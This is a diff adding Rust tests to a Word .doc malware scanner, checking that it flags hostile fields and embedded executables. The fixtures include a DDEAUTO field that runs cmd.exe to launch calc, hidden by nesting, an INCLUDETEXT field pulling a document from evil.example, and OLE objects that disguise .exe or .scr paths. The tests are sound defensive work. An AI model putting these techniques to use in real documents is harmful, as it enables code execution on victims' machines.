@@ -9,7 +9,7 @@ use std::path::PathBuf;
 use bookdoctor::cli::{Options, run};
 use bookdoctor::scan::scan_file;
 use bookdoctor::viewer::viewer_blocked;
-use ole_common::{Cfb, compress, dir_stream, make_cfb, module_stream};
+use ole_common::{Cfb, compress, dir_stream, make_cfb, make_cfb_v4, module_stream};
 use scan_common::{Category, FileReport, Finding, Format, Severity, ViewerBlocked};
 
 /// `WordDocument` 스트림: FIB 32바이트(wIdent, nFib, flags1)를 512바이트로 채우고 본문을 붙인다.
@@ -251,4 +251,67 @@ fn a_zip_named_doc_is_scanned_as_a_docx_package() {
 #[test]
 fn the_viewer_table_does_not_apply_to_doc() {
     assert_eq!(viewer_blocked(Format::Doc, "ANYTHING"), ViewerBlocked::NotApplicable);
+}
+
+#[test]
+fn a_nested_field_does_not_hide_the_outer_instruction() {
+    // 바깥 지시문 중간에 안쪽 필드가 끼어도 바깥 지시문 전체를 본다(Word는 안쪽 결과를 바깥 지시문에 이어 붙인다).
+    let before = "x \u{13} DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe \u{13} QUOTE a \u{14}b\u{15} \"/k calc\" \u{14}r\u{15} y";
+    let after = "x \u{13} INCLUDETEXT \u{13} MERGEFIELD a \u{14}b\u{15} \"http://evil.example/x.doc\" \u{14}r\u{15} y";
+    for (text, code) in [(before, "DOC_DDE_FIELD"), (after, "DOC_DANGEROUS_FIELD")] {
+        assert!(scan_doc(&[], 0, text.as_bytes()).has(code), "8bit {code}");
+        assert!(scan_doc(&[], 0, &utf16le(text)).has(code), "utf16 {code}");
+    }
+    // 중첩이 매우 깊어도 시간이 터지지 않고 미완료로 남는다.
+    let deep = "\u{13} A ".repeat(100_000);
+    let start = std::time::Instant::now();
+    let r = scan_doc(&[], 0, deep.as_bytes());
+    assert!(start.elapsed() < std::time::Duration::from_secs(5));
+    assert!(r.incomplete, "{:?}", r.reasons);
+}
+
+#[test]
+fn a_word_stream_larger_than_the_field_limit_is_incomplete() {
+    // 512바이트 섹터 fixture는 DIFAT 한도(약 7MiB)에 걸려 4096바이트 섹터로 만든다.
+    let word = word_stream(0, &vec![b'A'; 17 * 1024 * 1024]);
+    let (_d, p) = write("big.doc", &make_cfb_v4(&[("WordDocument", &word)]).bytes);
+    let r = scan_file(&p, &Options::default());
+    assert!(r.incomplete, "{:?}", r.reasons);
+    assert!(r.reasons.iter().any(|m| m.contains("WordDocument")), "{:?}", r.reasons);
+}
+
+#[test]
+fn a_doc_named_file_with_unanalyzed_content_is_incomplete() {
+    let r = scan_file(&write("a.doc", b"<html><body>hello</body></html>").1, &Options::default());
+    assert!(r.has("FORMAT_MISMATCH") && r.incomplete, "{:?} {:?}", r.findings, r.reasons);
+    let r = scan_file(&write("b.doc", "그냥 텍스트\n".repeat(50).as_bytes()).1, &Options::default());
+    assert!(r.incomplete, "{:?}", r.reasons);
+}
+
+#[test]
+fn an_executable_hidden_in_the_native_source_or_temp_path_is_flagged() {
+    // 레이블은 얌전하게 두고 원본 경로나 임시 경로에만 실행 파일 이름을 넣는다.
+    let native = |label: &str, src: &str, temp: &str| {
+        let mut body = Vec::new();
+        body.extend_from_slice(&2u16.to_le_bytes());
+        body.extend_from_slice(label.as_bytes());
+        body.push(0);
+        body.extend_from_slice(src.as_bytes());
+        body.push(0);
+        body.extend_from_slice(&0u32.to_le_bytes());
+        body.extend_from_slice(&((temp.len() + 1) as u32).to_le_bytes());
+        body.extend_from_slice(temp.as_bytes());
+        body.push(0);
+        body.extend_from_slice(&4u32.to_le_bytes());
+        body.extend_from_slice(b"data");
+        let mut s = (body.len() as u32).to_le_bytes().to_vec();
+        s.extend(body);
+        s
+    };
+    for (name, bytes) in [("src", native("notes.txt", "C:\\x\\run.exe", "C:\\t\\a.txt")), ("temp", native("notes.txt", "C:\\x\\a.txt", "C:\\t\\run.scr"))] {
+        let r = scan_doc(&[("ObjectPool/_1/\u{1}Ole10Native", &bytes)], 0, b"hi");
+        assert!(r.has("EMBEDDED_EXECUTABLE"), "{name}: {:?}", r.findings);
+    }
+    let clean = native("notes.txt", "C:\\x\\a.txt", "C:\\t\\a.txt");
+    assert!(!scan_doc(&[("ObjectPool/_1/\u{1}Ole10Native", &clean)], 0, b"hi").has("EMBEDDED_EXECUTABLE"));
 }
